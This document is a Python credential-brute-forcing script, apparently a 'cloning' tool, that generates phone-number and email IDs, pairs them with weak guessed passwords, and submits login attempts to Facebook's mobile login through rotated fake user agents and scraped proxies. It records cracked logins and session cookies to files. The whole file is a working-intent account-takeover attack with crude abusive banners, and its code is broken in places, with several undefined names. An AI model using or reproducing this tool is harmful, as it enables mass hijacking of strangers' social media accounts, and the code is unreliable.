#Create By: Md Farhan
#FaceBook: Md Farhan
#GitHub: https://github.com/DEMON-404
#---------------------------------------------------------------------------#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='NokiaN8-00/012.002;'
    e='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
# os.system('xdg-open https://github.com/DEMON-404/')
logo = ("""
\033[1;32m8888b.  888888 8b    d8  dP"Yb  88b 88 
\033[1;32m 8I  Yb 88__   88b  d88 dP   Yb 88Yb88 
\033[1;32m 8I  dY 88""   88YbdP88 Yb   dP 88 Y88 
\033[1;32m8888Y"  888888 88 YY 88  YbodP  88  Y8 
\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;37m[+] AUTHOR   : \033[1;32mMOHAMMAD JOBAID        
\033[1;37m[+] AUTHOR   : \033[1;32mMOHAMMAD FARHAN        
\033[1;37m[+] AUTHOR   : \033[1;32mISTYAK AL MAHMUD       
\033[1;37m[+] GITHUB   : \033[1;32mDEMON-404             
\033[1;37m[+] TOOLS    : \033[1;32mFREE     \033[1;37m              
\033[1;37m[+] VERSION  : \033[1;32m1.6  \033[1;37m                 
\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def Demonx():
 print('\033[1;30m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
pass
os.system('clear')
print(logo)
print("\033[1;32m [+]  \033[1;32mBypass \033[1;32mUser \033[1;32mFuck \033[1;32mYour \033[1;32mMother    \033[0;97m")
print('\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
import getpass

attemps = 0

while attemps < 12345677901:
 
    username = input(' \033[1;32m[+]\033[1;32m  Enter Licences : ')
    if username == 'ABC':
        print('\033[1;32m[✔]\033[1;32m Login Successfully')
        os.system("espeak -a 300 \"Login Successfully\"")
        print('\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        break
    else:
       jalan(' \033[1;32m[✖]\033[1;31m  Incorrect Licences')
       os.system("espeak -a 300 \"Incorrect, Licences,\"")
       attemps += 1
       continue
#---------------------[LOOP MENU]---------------------#
class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\033[1;32m [A] BD RANDOM CLONING")
        print("\033[1;32m [B] RANDOM GMAIL CLONING ")
        print("\033[1;91m [E] EXIT")
        print('\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        Demon = input(" [+] SELECT : ")
        # os.system('xdg-open https://www.facebook.com/D4M9N.A4T9H0R/')
        # os.system('xdg-open https://www.facebook.com/Jobaid.Nam.Toh.Sunso.E/')
        if Demon in ["1", "A"]:
            num()
        if Demon in ["2","B"]:
            gml()
        if Demon in [" 0", "E"]:
            exit()
        else:
            exit()
def num():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[1;32m [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
    print('\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    kode = input('\033[1;32m [+] CHOOSE : ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('\033[1;32m [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print('\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input('\033[1;32m [+] LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as TC:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;97m[🌿] SIM 3G,4G +WIFI')
        print('\033[1;97m[🌿] Total ids: '+tl)
        print("\033[1;97m[🌿] Number: "+kode)
        print('\033[1;97m[🌿] Airplne Moode On/Off')
        print('-------------------')
        for love in user:
                        ids = kode + love 
                        pasx = [love,ids,ids[:8],ids[:7],'@@@###','102030','405060','708090']
                        Jarif.submit(rndmx,ids,pasx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')

def gml():
    user=[]
    os.system('clear')
    print(logo)
    kode = input('\033[1;32m [+] TARGET FIRST NAME : ')
    os.system('clear')
    print(logo)
    kodex = input('\033[1;32m [+] TARGET LAST NAME :  ')
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    doamin = input('\033[1;32m [📧]  INPUT DOMINE  : ')
    os.system('clear')
    print(logo)
    print('\033[1;32m [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input('[+] LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as TC:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[ðŸŒ¿] SIM 2G,3G,4G,5G +WIFI')
        print('[ðŸŒ¿] Total ids: '+tl)
        print("[ðŸŒ¿] Your Code: "+code)
        print('[ðŸŒ¿] Airplne Moode On/Off')
        print('[ðŸŒ¿] Process has been started')
        print('-------------------')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love]
            TC.submit(CIPHER,uid,pwx,tl)
    print('-------------------')
    print(' [âœ“] Crack process has been completed')
    print(' [âœ“] OK Ids saved as XARIF-OK.txt')
    print(' [âœ“] CP Id Save as XARIF-XD-CP.txt')
    print('-------------------')
def CIPHER(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[-FUCKING]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {  'authority': 'm.facebook.com',
      'method': 'GET',
      'path': '/',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.5',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"V2111"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
        'user-agent': pro} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[1;32m' [-FUCKED-OK] {uid} / {ps}")
                open(' /sdcard/BLAZE-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                
                open('/sdcard/JARIF-cp.txt', 'a').write( uid+' | '+ps+'')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
